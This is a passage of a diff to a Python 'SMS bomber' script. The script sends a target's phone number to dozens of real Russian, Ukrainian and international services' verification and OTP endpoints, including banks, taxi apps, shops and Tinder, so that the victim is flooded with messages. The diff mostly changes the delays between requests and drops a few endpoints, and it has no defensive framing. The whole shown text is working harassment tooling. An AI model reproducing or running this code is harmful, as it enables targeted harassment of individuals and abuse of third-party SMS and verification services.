                           json={"phone": "+" + _phone, "api": 2, "email": "email", "x-email": "x-email"})
             R = R + 1
             print('[+] Mail.ru Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -5738,7 +5579,7 @@ if call == str(2):
                           data={"phone": _phone, "recaptcha": 'off', "g-recaptcha-response": ""})
             R = R + 1
             print('[+] MVideo Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -5750,33 +5591,10 @@ if call == str(2):
                           data={"st.r.phone": "+" + _phone})
             R = R + 1
             print('[+] OK Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("The attack is over! Press ENTER to close...")
-            break
-        try:
-            requests.post("https://qlean.ru/clients-api/v2/sms_codes/auth/request_code", json={"phone": _phone})
-            R = R + 1
-            print('[+] qlean Was sent! || Count - ' + str(R))
-            time.sleep(0)
-        except:
-            print('[-] Error in sent!')
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("The attack is over! Press ENTER to close...")
-            break
-        try:
-            requests.post('https://sso.cloud.qlean.ru/http/users/requestotp',
-                          headers={"Referer": "https://qlean.ru/sso?redirectUrl=https://qlean.ru/"},
-                          params={"phone": _phone, "clientId": "undefined", "sessionId": str(randint(5000, 9999))})
-            R = R + 1
-            print('[+] Qlean Was sent! || Count - ' + str(R))
-            time.sleep(0)
-        except:
-            print('[-] Error in sent!')
+
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
             print("The attack is over! Press ENTER to close...")
@@ -5785,7 +5603,7 @@ if call == str(2):
             requests.post("http://smsgorod.ru/sendsms.php", data={"number": _phone})
             R = R + 1
             print('[+] SMSgorod Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -6153,28 +5971,6 @@ if call == str(2):
             print("The attack is over! Press ENTER to close...")
             break
         try:
-            requests.post('https://plink.tech/register/', json={"phone": _phone})
-            R = R + 1
-            print('[+] Plink Was sent! || Count - ' + str(R))
-        except:
-            print('[-] Error in sent!')
-
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("The attack is over! Press ENTER to close...")
-            break
-        try:
-            requests.post("https://qlean.ru/clients-api/v2/sms_codes/auth/request_code", json={"phone": _phone})
-            R = R + 1
-            print('[+] qlean Was sent! || Count - ' + str(R))
-        except:
-            print('[-] Error in sent!')
-
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("The attack is over! Press ENTER to close...")
-            break
-        try:
             requests.post("http://smsgorod.ru/sendsms.php", data={"number": _phone})
             R = R + 1
             print('[+] SMSgorod Was sent! || Count - ' + str(R))
@@ -6301,7 +6097,7 @@ if call == str(2):
                                 "password": password, "phone_number": _phone, "username": username})
             R = R + 1
             print('[+] Twitch Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -6313,7 +6109,7 @@ if call == str(2):
                           headers={'App-ID': 'cabinet'})
             R = R + 1
             print('[+] CabWiFi Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -6324,7 +6120,7 @@ if call == str(2):
             requests.post("https://api.wowworks.ru/v2/site/send-code", json={"phone": _phone, "type": 2})
             R = R + 1
             print('[+] wowworks Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -6336,7 +6132,7 @@ if call == str(2):
                           json={"phone_number": "+" + _phone})
             R = R + 1
             print('[+] Eda.Yandex Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -6347,7 +6143,7 @@ if call == str(2):
             requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
             R = R + 1
             print('[+] Youla Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -6360,7 +6156,7 @@ if call == str(2):
                                 "deliveryOption": "sms"})
             R = R + 1
             print('[+] Alpari Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -6371,7 +6167,7 @@ if call == str(2):
             requests.post("https://api-prime.anytime.global/api/v2/auth/sendVerificationCode", data={"phone": _phone})
             R = R + 1
             print('[+] SMS Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -6407,7 +6203,7 @@ if call == str(2):
                           data={'phoneNumber': _phone, 'countryCode': 'ID', 'name': 'test', 'email': 'mail@mail.com',
                                 'deviceToken': '*'}, headers={
                     'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'})
-            time.sleep(0)
+            time.sleep(1)
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
             print("The attack is over! Press ENTER to close...")
@@ -6416,7 +6212,7 @@ if call == str(2):
             requests.post('https://moscow.rutaxi.ru/ajax_keycode.html', data={'l': _phone9}).json()["res"]
             R = R + 1
             print('[+] RuTaxi Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -6427,7 +6223,7 @@ if call == str(2):
             requests.post('https://belkacar.ru/get-confirmation-code', data={'phone': _phone}, headers={})
             R = R + 1
             print('[+] BelkaCar Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -6439,7 +6235,7 @@ if call == str(2):
                           data={'aj': '50', 'registration-phone': _phone})
             R = R + 1
             print('[+] StarPizzaCafe Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -6451,7 +6247,7 @@ if call == str(2):
                           data={'phone_number': _phone}, headers={})
             R = R + 1
             print('[+] Tinder Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
 
@@ -6464,7 +6260,7 @@ if call == str(2):
             requests.post('https://api.tinkoff.ru/v1/sign_up', data={'phone': '+' + _phone}, headers={})
             R = R + 1
             print('[+] Tinkoff Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -6476,7 +6272,7 @@ if call == str(2):
             requests.post('https://dostavista.ru/backend/send-verification-sms', data={"phone": _phone})
             R = R + 1
             print('[+] Dostavista Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -6489,7 +6285,7 @@ if call == str(2):
             requests.post('https://www.monobank.com.ua/api/mobapplink/send', data={"phone": "+" + _phone})
             R = R + 1
             print('[+] MonoBank Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -6501,7 +6297,7 @@ if call == str(2):
             requests.post('https://widgets.binotel.com/getcall/call/', {"status": "success", "GetCallID": 13302425})
             R = R + 1
             print('[+] binotel Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -6513,7 +6309,7 @@ if call == str(2):
                          data={"phone": _phone})
             R = R + 1
             print('[+] SportMaster Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -6525,7 +6321,7 @@ if call == str(2):
             requests.post('https://alfalife.cc/auth.php', data={"phone": _phone})
             R = R + 1
             print('[+] Alfalife Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -6536,7 +6332,7 @@ if call == str(2):
             requests.post('https://koronapay.com/transfers/online/api/users/otps', data={"phone": _phone})
             R = R + 1
             print('[+] KoronaPay Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
 
@@ -6550,7 +6346,7 @@ if call == str(2):
                                 "oferta": "on", })
             R = R + 1
             print('[+] GGbet Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -6563,7 +6359,7 @@ if call == str(2):
                                 "getSysParam": "yes", })
             R = R + 1
             print('[+] ETM Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -6575,7 +6371,7 @@ if call == str(2):
             requests.post('https://thehive.pro/auth/signup', json={"phone": "+" + _phone, })
             R = R + 1
             print('[+] TheLive Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -6586,7 +6382,7 @@ if call == str(2):
             requests.post('https://api.mtstv.ru/v1/users', json={'msisdn': _phone}, headers={})
             R = R + 1
             print('[+] MTS Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -6597,7 +6393,7 @@ if call == str(2):
             requests.post('https://account.my.games/signup_send_sms/', data={"phone": _phone})
             R = R + 1
             print('[+] MyGames Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -6611,7 +6407,7 @@ if call == str(2):
                                 "phone": (_phone, "+* (***) ***-**-**"), "email": _email, "city": "Москва", })
             R = R + 1
             print('[+] Zoloto585 Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -6622,7 +6418,7 @@ if call == str(2):
             requests.post('https://kasta.ua/api/v2/login/', data={"phone": _phone})
             R = R + 1
             print('[+] Kasta Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -6634,7 +6430,7 @@ if call == str(2):
                           data={"RECALL": "Y", "BACK_CALL_PHONE": _phone})
             R = R + 1
             print('[+] Тaxi Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -6647,7 +6443,7 @@ if call == str(2):
                           json={"phone": "+" + _phone, "api": 2, "email": "email", "x-email": "x-email", })
             R = R + 1
             print('[+] Mail.ru Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -6659,7 +6455,7 @@ if call == str(2):
                           json={"phone": (_phone, "+* (***) ***-**-**"), "type": "register", })
             R = R + 1
             print('[+] Creditter Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -6675,7 +6471,7 @@ if call == str(2):
                                 "SecondName": _name, "Phone": _phone, "Email": _email, })
             R = R + 1
             print('[+] Ingos Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -6688,7 +6484,7 @@ if call == str(2):
                                 "email": "", "lang": "en", })
             R = R + 1
             print('[+] Admiralxxx Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -6699,7 +6495,7 @@ if call == str(2):
             requests.post('https://oauth.av.ru/check-phone', json={"phone": (_phone, "+* (***) ***-**-**")})
             R = R + 1
             print('[+] Av Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -6711,7 +6507,7 @@ if call == str(2):
                           params={"msisdn": _phone})
             R = R + 1
             print('[+] MTS Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -6722,7 +6518,7 @@ if call == str(2):
             requests.post('https://city24.ua/personalaccount/account/registration', data={"PhoneNumber": _phone})
             R = R + 1
             print('[+] City24 Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -6733,7 +6529,7 @@ if call == str(2):
             requests.post('https://client-api.sushi-master.ru/api/v1/auth/init', json={"phone": _phone})
             R = R + 1
             print('[+] SushiMaster Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -6744,7 +6540,7 @@ if call == str(2):
             requests.post('https://auth.multiplex.ua/login', json={"login": _phone})
             R = R + 1
             print('[+] MultiPlex Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -6755,7 +6551,7 @@ if call == str(2):
             requests.post('https://3040.com.ua/taxi-ordering', data={"callback-phone": _phone})
             R = R + 1
             print('[+] 3040 Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -6767,7 +6563,7 @@ if call == str(2):
                           data={"REGISTER[PERSONAL_PHONE]": _phone, "code": "", "sendsms": "Выслать код", })
             R = R + 1
             print('[+] Niyama Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -6778,7 +6574,7 @@ if call == str(2):
             requests.post('https://shop.vsk.ru/ajax/auth/postSms/', data={"phone": _phone})
             R = R + 1
             print('[+] VSK Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -6789,7 +6585,7 @@ if call == str(2):
             requests.post('https://api.easypay.ua/api/auth/register', json={"phone": _phone, "password": _password})
             R = R + 1
             print('[+] EasyPay Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -6801,7 +6597,7 @@ if call == str(2):
                           data={"register_call": "Y", "action": "getCode", "phone": "+" + _phone})
             R = R + 1
             print('[+] Fix-Price Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
 
@@ -6813,7 +6609,7 @@ if call == str(2):
             requests.post('https://msk.tele2.ru/api/validation/number/' + _phone, json={"sender": "Tele2"})
             R = R + 1
             print('[+] Tele2 Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -6824,7 +6620,7 @@ if call == str(2):
             requests.get('https://www.finam.ru/api/smslocker/sendcode', data={"phone": "+" + _phone})
             R = R + 1
             print('[+] Finam Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -6836,7 +6632,7 @@ if call == str(2):
                           params={"cb_fio": _name, "cb_phone": format(_phone, "+* *** *** ** **")})
             R = R + 1
             print('[+] MakiMaki Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -6850,7 +6646,7 @@ if call == str(2):
                           json={"loginId": "+" + _phone, "supportAllStates": True})
             R = R + 1
             print('[+] FlipKart Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -6861,7 +6657,7 @@ if call == str(2):
             requests.post('https://secure.online.ua/ajax/check_phone/', params={"reg_phone": _phone})
             R = R + 1
             print('[+] Online.ua Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -6872,7 +6668,7 @@ if call == str(2):
             requests.post('https://cabinet.planetakino.ua/service/sms', params={"phone": _phone})
             R = R + 1
             print('[+] PlanetaKino Was sent!')
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -6884,7 +6680,7 @@ if call == str(2):
                           json={"country": _codes[_code].upper(), "phone": _phone, })
             R = R + 1
             print('[+] OnTaxi Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -6895,7 +6691,7 @@ if call == str(2):
             requests.post('https://ube.pmsm.org.ru/esb/iqos-phone/validate', json={"phone": _phone})
             R = R + 1
             print('[+] Iqos Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -6907,7 +6703,7 @@ if call == str(2):
                           json={"mobile": "+" + _phone, "action": "confirm_mobile"})
             R = R + 1
             print('[+] Smart.Space Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
 
@@ -6921,7 +6717,7 @@ if call == str(2):
                                 'phone': _phone})
             R = R + 1
             print('[+] tarantino-family Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -6937,7 +6733,7 @@ if call == str(2):
                                 "utc_offset": "120", })
             R = R + 1
             print('[+] Apteka Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -6949,7 +6745,7 @@ if call == str(2):
                           headers={"client_id": "6289de851fc726f887af8d5d7a56c635"}, json={"phone": _phone})
             R = R + 1
             print('[+] Uklon Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -6961,7 +6757,7 @@ if call == str(2):
                           json={"phone": _phone, "otpId": 0})
             R = R + 1
             print('[+] Ozon Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -6974,7 +6770,7 @@ if call == str(2):
                                  "gorod": "Москва", "approving_data": "1", })
             R = R + 1
             print('[+] Banki Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -6985,7 +6781,7 @@ if call == str(2):
             requests.post('https://api.ivi.ru/mobileapi/user/register/phone/v6', data={"phone": _phone})
             R = R + 1
             print('[+] IVI Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -6997,7 +6793,7 @@ if call == str(2):
                           data={"firstname": _name, "phone": _phone, "email": _email})
             R = R + 1
             print('[+] Moyo Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -7008,7 +6804,7 @@ if call == str(2):
             requests.post('https://helsi.me/api/healthy/accounts/login', json={"phone": _phone, "platform": "PISWeb"})
             R = R + 1
             print('[+] Helsi Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -7020,7 +6816,7 @@ if call == str(2):
                           json={"Phone": _phone, "Type": 1})
             R = R + 1
             print('[+] KinoLend Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -7033,7 +6829,7 @@ if call == str(2):
                                 '_token': '*'})
             R = R + 1
             print('[+] PizzaHut Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -7045,7 +6841,7 @@ if call == str(2):
             requests.post('https://www.rabota.ru/remind', data={'credential': _phone})
             R = R + 1
             print('[+] Rabota Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -7056,7 +6852,7 @@ if call == str(2):
             requests.post('https://rutube.ru/api/accounts/sendpass/phone', data={'phone': '+' + _phone})
             R = R + 1
             print('[+] Rutube Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Rutube in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -7067,7 +6863,7 @@ if call == str(2):
             requests.post('https://www.citilink.ru/registration/confirm/phone/+' + _phone + '/')
             R = R + 1
             print('[+] Citilink Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -7079,7 +6875,7 @@ if call == str(2):
                           data={'name': _name, 'phone': _phone, 'promo': 'yellowforma'})
             R = R + 1
             print('[+] Smsint Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -7091,7 +6887,7 @@ if call == str(2):
                 'https://www.oyorooms.com/api/pwa/generateotp?phone=' + _phone9 + '&country_code=%2B7&nod=4&locale=en')
             R = R + 1
             print('[+] oyorooms Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -7104,7 +6900,7 @@ if call == str(2):
                           data={"phone": _phone, "recaptcha": "off", "g-recaptcha-response": "", })
             R = R + 1
             print('[+] MVIDEO Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -7117,7 +6913,7 @@ if call == str(2):
                                                               'query': 'mutation registration($client: ClientInput!) {''\n  registration(client: $client) {''\n    token\n    __typename\n  }\n}\n'})
             R = R + 1
             print('[+] newnext Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -7128,7 +6924,7 @@ if call == str(2):
             requests.post('https://api.sunlight.net/v3/customers/authorization/', data={'phone': _phone})
             R = R + 1
             print('[+] Sunlight Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -7141,7 +6937,7 @@ if call == str(2):
                                 'deliveryOption': 'sms'})
             R = R + 1
             print('[+] alpari Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -7152,7 +6948,7 @@ if call == str(2):
             requests.post('https://lk.invitro.ru/lk2/lka/patient/refreshCode', data={'phone': _phone})
             R = R + 1
             print('[+] Invitro Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -7165,7 +6961,7 @@ if call == str(2):
                                 'params': {'phone': _phone}, 'id': '1'})
             R = R + 1
             print('[+] Sberbank Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
 
@@ -7178,7 +6974,7 @@ if call == str(2):
                           params={"msisdn": _phone})
             R = R + 1
             print('[+] MTS Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -7190,7 +6986,7 @@ if call == str(2):
                           data={"SignupForm[username]": _phone, "SignupForm[device_type]": 3})
             R = R + 1
             print('[+] Delitime Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -7202,7 +6998,7 @@ if call == str(2):
                           json={"phone": {"code": 1, "number": _phone}})
             R = R + 1
             print('[+] Guru Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -7215,7 +7011,7 @@ if call == str(2):
                                 "k": "ic1rtwz1s1Hj1O0r", "r": "46763"})
             R = R + 1
             print('[+] ICQ Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -7228,7 +7024,7 @@ if call == str(2):
                                 "v": 3, "appversion": "3.20.6", "osversion": "unknown", "devicemodel": "unknown"})
             R = R + 1
             print('[+] InDriver Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -7240,7 +7036,7 @@ if call == str(2):
                           data={"password": password, "application": "lkp", "login": "+" + _phone})
             R = R + 1
             print('[+] Invitro Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -7251,7 +7047,7 @@ if call == str(2):
             requests.post('https://ube.pmsm.org.ru/esb/iqos-phone/validate', json={"phone": _phone})
             R = R + 1
             print('[+] Pmsm Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -7262,7 +7058,7 @@ if call == str(2):
             requests.post("https://api.ivi.ru/mobileapi/user/register/phone/v6", data={"phone": _phone})
             R = R + 1
             print('[+] IVI Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -7273,7 +7069,7 @@ if call == str(2):
             requests.post('https://lenta.com/api/v1/authentication/requestValidationCode', json={'phone': '+' + _phone})
             R = R + 1
             print('[+] Lenta Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -7285,7 +7081,7 @@ if call == str(2):
                           json={"phone": "+" + _phone, "api": 2, "email": "email", "x-email": "x-email"})
             R = R + 1
             print('[+] Mail.ru Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -7298,7 +7094,7 @@ if call == str(2):
                           data={"phone": _phone, "recaptcha": 'off', "g-recaptcha-response": ""})
             R = R + 1
             print('[+] MVideo Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -7310,33 +7106,10 @@ if call == str(2):
                           data={"st.r.phone": "+" + _phone})
             R = R + 1
             print('[+] OK Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("The attack is over! Press ENTER to close...")
-            break
-        try:
-            requests.post("https://qlean.ru/clients-api/v2/sms_codes/auth/request_code", json={"phone": _phone})
-            R = R + 1
-            print('[+] qlean Was sent! || Count - ' + str(R))
-            time.sleep(0)
-        except:
